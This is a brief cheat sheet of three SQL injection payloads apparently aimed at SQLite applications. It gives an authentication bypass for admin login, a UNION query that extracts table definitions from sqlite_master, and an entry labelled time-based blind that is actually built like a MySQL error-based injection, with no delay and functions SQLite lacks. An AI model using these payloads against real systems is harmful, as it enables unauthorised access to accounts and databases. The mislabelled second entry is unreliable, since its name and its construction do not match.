1. Bypass Authentication (Admin Entry):
' OR 1=1 --

2. Time-Based Blind SQLi (SQLite):
' OR (SELECT 1 FROM (SELECT count(*), concat((SELECT sqlite_version()), floor(random()*2)) x FROM sqlite_master GROUP BY x) y) --

3. Union Based SQLi (Discovering table data):
' UNION SELECT 1, sql, 3, 4, 5, 6 FROM sqlite_master --
